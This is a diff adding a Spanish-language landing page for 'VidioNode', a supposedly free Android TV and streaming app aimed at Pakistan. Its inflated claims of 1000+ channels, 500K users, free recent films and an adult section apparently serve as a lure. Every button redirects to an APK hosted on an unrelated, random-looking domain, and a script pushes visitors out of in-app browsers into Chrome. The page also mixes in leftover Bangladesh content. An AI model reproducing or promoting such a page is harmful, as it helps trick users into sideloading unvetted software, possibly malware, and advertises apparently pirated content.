@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>VidioNode — TV, películas y deportes gratis para Pakistán | Android</title>
+    <meta name="description" content="VidioNode — Más de 1000 canales en vivo: deportes, películas, series y noticias. Gratis, sin registro. Descargar APK para Android en Pakistán.">
+
+    <link href="css/css2.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+	
+</head>
+
+<body>
+
+    <nav class="nav">
+        <div class="nav-logo">
+            <img src="images/logo.jpg" alt="VidioNode" width="32" height="32">
+            <span>VidioNode</span>
+        </div>
+        <div class="nav-right">
+            <a onclick="handleDownload()" class="nav-dl" data-i18n="nav_inst">Instalación</a>
+        </div>
+    </nav>
+
+    <div class="bd-flags"></div>
+
+    <section class="hero">
+        <div class="hero-bg"></div>
+        <div class="hero-inner">
+            <div class="hero-chip"><span class="dot"></span> <span data-i18n="chip">Ver gratis ahora</span>
+            </div>
+            <h1><span data-i18n="h1a">Televisión y deportes</span><br><span class="gold" data-i18n="h1b">Películas,
+                    series y programas para toda la familia</span><br><span data-i18n="h1c">— Siempre gratis</span></h1>
+            <p class="hero-sub" data-i18n="hero_sub">Más de 1000 canales sin costo — Fútbol, PSL y ligas mundiales, películas, series y noticias de Pakistán. Calidad HD, sin publicidad y sin registro.</p>
+            <div class="hero-cta">
+                <button class="btn-dl" onclick="handleDownload()">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path>
+                    </svg>
+                    <span data-i18n="cta_dl">Descargar APK gratis</span>
+                </button>
+            </div>
+            <div class="hero-info">
+                <div class="hero-info-item">
+                    <div class="val">1000+</div>
+                    <div class="lbl" data-i18n="hi1">Canales</div>
+                </div>
+                <div class="hero-info-item">
+                    <div class="val">4K</div>
+                    <div class="lbl" data-i18n="hi2">Calidad</div>
+                </div>
+                <div class="hero-info-item">
+                    <div class="val">500K+</div>
+                    <div class="lbl" data-i18n="hi3">Usuarios</div>
+                </div>
+                <div class="hero-info-item">
+                    <div class="val">Gratis</div>
+                    <div class="lbl" data-i18n="hi4">Siempre</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <!-- Películas populares -->
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">🎬</span> <span data-i18n="cat1_h">Películas en tendencia</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat1_sub">Nuevos lanzamientos mundiales y películas favoritas • Estrenos de 2026 • Ver gratis en la app en Pakistán</p>
+        <div class="cat-scroll">
+            <div class="scroll-track">
+                <div class="content-card" onclick="handleDownload()">
+                    <div class="thumb"><img src="images/movie1.jpg" alt="Poran" loading="lazy"><span class="badge hd">4K</span><span class="badge2">Gratis</span></div>
+                    <div class="title" data-i18n="m1">Poran</div>
+                    <div class="meta" data-i18n="m1d">2026 • Drama romántico</div>
+                </div>
+                <div class="content-card" onclick="handleDownload()">
+                    <div class="thumb"><img src="images/movie2.jpg" alt="Hawa" loading="lazy"><span class="badge hd">HD</span><span class="badge2">Gratis</span></div>
+                    <div class="title" data-i18n="m2">Hawa</div>
+                    <div class="meta" data-i18n="m2d">2026 • Thriller</div>
+                </div>
+                <div class="content-card" onclick="handleDownload()">
+                    <div class="thumb"><img src="images/movie3.jpg" alt="Surongo" loading="lazy"><span class="badge hd">4K</span><span class="badge2">Gratis</span></div>
+                    <div class="title" data-i18n="m3">Surongo</div>
+                    <div class="meta" data-i18n="m3d">2026 • Atraco, Thriller</div>
+                </div>
+                <div class="content-card" onclick="handleDownload()">
+                    <div class="thumb"><img src="images/movie4.jpg" alt="Priyotama" loading="lazy"><span class="badge hd">4K</span><span class="badge2">Gratis</span></div>
+                    <div class="title" data-i18n="m4">Priyotama</div>
+                    <div class="meta" data-i18n="m4d">2026 • Drama romántico</div>
+                </div>
+                <div class="content-card" onclick="handleDownload()">
+                    <div class="thumb"><img src="images/movie5.jpg" alt="Gondi" loading="lazy"><span class="badge hd">HD</span><span class="badge2">Gratis</span></div>
+                    <div class="title" data-i18n="m5">Gondi</div>
+                    <div class="meta" data-i18n="m5d">2026 • Acción</div>
+                </div>
+                <div class="content-card" onclick="handleDownload()">
+                    <div class="thumb"><img src="images/pathaan.jpg" alt="Pathaan" loading="lazy"><span class="badge hd">HD</span><span class="badge2">Gratis</span></div>
+                    <div class="title" data-i18n="m6">Pathaan</div>
+                    <div class="meta" data-i18n="m6d">Bollywood • Acción de espionaje</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">⚽</span> <span data-i18n="cat2_h">Deportes en vivo</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat2_sub">🇵🇰 Equipo nacional de Pakistán y PSL • Fútbol europeo • Cricket • Grandes torneos — En vivo gratis</p>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">🎭</span> <span data-i18n="cat6_h">Programas de entrevistas y realities</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat6_sub">Formatos globales • Programas de música • Comedia y Stand-up • Ver gratis</p>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">📺</span> <span data-i18n="cat7_h">Series populares</span></h2>
+            
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat7_sub">Éxitos asiáticos y mundiales • Dramas y romances • Fácilmente disponibles en Pakistán</p>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">📺</span> <span data-i18n="cat3_h">Canales de noticias y entretenimiento</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat3_sub">Noticias de PTV, Geo TV y feeds globales • Música • En vivo gratis 24/7</p>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">🎥</span> <span data-i18n="cat9_h">Éxitos de taquilla del sur de Asia</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat9_sub">Pushpa • KGF • RRR • Baahubali • Con doblaje y subtítulos • Gratis</p>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="priv-section">
+        <div class="cat-header">
+            <h2><span class="emoji">🔒</span> <span data-i18n="priv_h">Contenido +18</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="priv_sub">Solo para adultos • Sección separada • HD • Gratis en la app</p>
+        <div class="priv-card">
+            <div class="lock-icon">🔞</div>
+            <h3 data-i18n="priv_t">Canales privados +18</h3>
+            <p data-i18n="priv_d">Una categoría separada para el público adulto está disponible en la app.</p>
+            <button class="priv-btn" onclick="handleDownload()" data-i18n="priv_btn">Abrir en la app — Acceso gratis</button>
+        </div>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">🇰🇷</span> <span data-i18n="cat8_h">K-Dramas y Anime</span></h2><span class="see-all" data-i18n="cat8_more">En la app →</span>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat8_sub">El juego del calamar • Crash Landing on You • Demon Slayer • True Beauty • Gratis</p>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">📈</span> <span data-i18n="cat5_h">Finanzas, mercados y criptomonedas</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat5_sub">Índice PSX • BTC/ETH • Tasa USD/PKR • Noticias bancarias de Pakistán • Mercados y economía</p>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="highlights">
+        <div class="container">
+            <div class="cat-header" style="padding:0;margin-bottom:14px">
+                <h2><span class="emoji">✨</span> <span data-i18n="why_h">¿Por qué VidioNode?</span></h2>
+            </div>
+            <div class="hl-grid">
+                <div class="hl-card">
+                    <div class="icon">📡</div>
+                    <h3 data-i18n="w1">1000+ Canales</h3>
+                    <p data-i18n="w1d">TV en línea de más de 130 países, fácilmente disponible en Pakistán</p>
+                </div>
+                <div class="hl-card">
+                    <div class="icon">🎬</div>
+                    <h3 data-i18n="w2">Películas sin suscripción</h3>
+                    <p data-i18n="w2d">Éxitos, K-Dramas, estrenos globales</p>
+                </div>
+                <div class="hl-card">
+                    <div class="icon">⚽</div>
+                    <h3 data-i18n="w3">Deportes en vivo</h3>
+                    <p data-i18n="w3d">Fútbol, cricket, boxeo y más</p>
+                </div>
+                <div class="hl-card">
+                    <div class="icon">🚫</div>
+                    <h3 data-i18n="w4">Sin anuncios</h3>
+                    <p data-i18n="w4d">Sin ventanas emergentes molestas</p>
+                </div>
+                <div class="hl-card">
+                    <div class="icon">📱</div>
+                    <h3 data-i18n="w5">Calidad hasta 4K</h3>
+                    <p data-i18n="w5d">Imagen nítida en tu Android</p>
+                </div>
+                <div class="hl-card">
+                    <div class="icon">🌍</div>
+                    <h3 data-i18n="w6">Interfaz en urdu</h3>
+                    <p data-i18n="w6d">Catálogo e instrucciones en urdu</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="compare">
+        <h2 data-i18n="vs_h">VidioNode vs Servicios de pago</h2>
+        <table class="compare-table">
+            <tbody>
+                <tr>
+                    <th data-i18n="vs_feat">Característica</th>
+                    <th class="VidioNode-col">VidioNode</th>
+                    <th data-i18n="vs_others">Otros</th>
+                </tr>
+                <tr>
+                    <td data-i18n="vs1">Cuota mensual</td>
+                    <td class="check" data-i18n="vs1a">100% Gratis</td>
+                    <td class="cross" data-i18n="vs1b">Planes de pago</td>
+                </tr>
+                <tr>
+                    <td data-i18n="vs2">Deportes en vivo</td>
+                    <td class="check" data-i18n="vs2a">✓ Amplia selección</td>
+                    <td class="cross" data-i18n="vs2b">Limitado</td>
+                </tr>
+                <tr>
+                    <td data-i18n="vs3">Canales de TV</td>
+                    <td class="check" data-i18n="vs3a">1000+</td>
+                    <td class="cross" data-i18n="vs3b">50–200</td>
+                </tr>
+                <tr>
+                    <td data-i18n="vs4">Anuncios</td>
+                    <td class="check" data-i18n="vs4a">No</td>
+                    <td class="cross" data-i18n="vs_yes">Sí</td>
+                </tr>
+                <tr>
+                    <td data-i18n="vs5">Registro obligatorio</td>
+                    <td class="check" data-i18n="vs_no">No</td>
+                    <td class="cross" data-i18n="vs_yes">Sí</td>
+                </tr>
+                <tr>
+                    <td data-i18n="vs6">4K</td>
+                    <td class="check">✓</td>
+                    <td data-i18n="vs6b">Varía</td>
+                </tr>
+            </tbody>
+        </table>
+    </section>
+
+    <div class="cta-banner">
+        <h2 data-i18n="cta_h">Empieza a ver ahora</h2>
+        <p data-i18n="cta_p">Más de 500 mil usuarios están viendo gratis — incluyendo usuarios de Pakistán</p>
+    </div>
+
+    <section class="install-section">
+        <h2><span class="emoji">📲</span> <span data-i18n="inst_h">Instalación rápida</span></h2>
+    </section>
+
+    <section class="faq-section">
+        <h2 data-i18n="faq_h">Preguntas frecuentes (FAQ)</h2>
+    </section>
+
+    <footer class="footer">
+        🇵🇰 © 2026 VidioNode — Para la audiencia de Pakistán<br><a href="/privacy.php" style="color:rgba(255,255,255,.25);margin:0 6px" data-i18n="footer_priv">Política de privacidad</a> | <a href="/terms.php" style="color:rgba(255,255,255,.25);margin:0 6px" data-i18n="footer_terms">Términos</a>
+    </footer>
+
+    <script>
+        function handleDownload() {
+            window.location.href = 'https://agszk.azmekl.com/AvidioNode.apk';
+        }
+        function wvRetryIntent() {
+            var url = encodeURIComponent(location.href);
+            window.location.href = 'googlechrome://navigate?url=' + url;
+        }
+        function wvCopy() {
+            var u = location.href;
+            var el = document.getElementById('wvCopied');
+            function showOk() { if (el) { el.style.display = 'block'; } }
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(u).then(showOk).catch(function () { prompt('Copiar:', u); });
+            } else {
+                prompt('Copiar:', u);
+            }
+        }
+        function wvWhatsApp() {
+            //window.open('https://wa.me/?text=' + encodeURIComponent(location.href), '_blank');
+        }
+
+        (function initAutoSliders() {
+            if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
+
+            function attachAutoScroll(el, staggerMs) {
+                var track = el.querySelector('.scroll-track');
+                if (!track || !track.firstElementChild) return;
+
+                var intervalMs = 4200;
+                var resumeDelayMs = 4000;
+                var timer = null;
+                var paused = false;
+                var userPauseTimer = null;
+
+                function pauseFromUser() {
+                    paused = true;
+                    clearTimeout(userPauseTimer);
+                    userPauseTimer = setTimeout(function () { paused = false; }, resumeDelayMs);
+                }
+
+                el.addEventListener('touchstart', pauseFromUser, { passive: true });
+                el.addEventListener('wheel', pauseFromUser, { passive: true });
+                el.addEventListener('pointerdown', pauseFromUser);
+
+                function step() {
+                    if (paused) return;
+                    var maxScroll = el.scrollWidth - el.clientWidth;
+                    if (maxScroll <= 4) return;
+
+                    var first = track.firstElementChild;
+                    var gap = parseFloat(getComputedStyle(track).gap) || 12;
+                    var stride = first.offsetWidth + gap;
+
+                    var next = el.scrollLeft + stride;
+                    if (next >= maxScroll - 4) {
+                        el.scrollTo({ left: 0, behavior: 'smooth' });
+                    } else {
+                        el.scrollBy({ left: stride, behavior: 'smooth' });
+                    }
+                }
+
+                function startWhenVisible() {
+                    if ('IntersectionObserver' in window) {
+                        var obs = new IntersectionObserver(function (entries) {
+                            entries.forEach(function (e) {
+                                if (e.isIntersecting) {
+                                    if (!timer) timer = setInterval(step, intervalMs);
+                                } else {
+                                    if (timer) { clearInterval(timer); timer = null; }
+                                }
+                            });
+                        }, { rootMargin: '80px', threshold: 0.01 });
+                        obs.observe(el);
+                    } else {
+                        timer = setInterval(step, intervalMs);
+                    }
+                }
+
+                setTimeout(startWhenVisible, staggerMs);
+            }
+
+            document.querySelectorAll('.cat-scroll').forEach(function (el, i) {
+                attachAutoScroll(el, i * 450);
+            });
+        })();
+    </script>
+
+</body>
+</html>
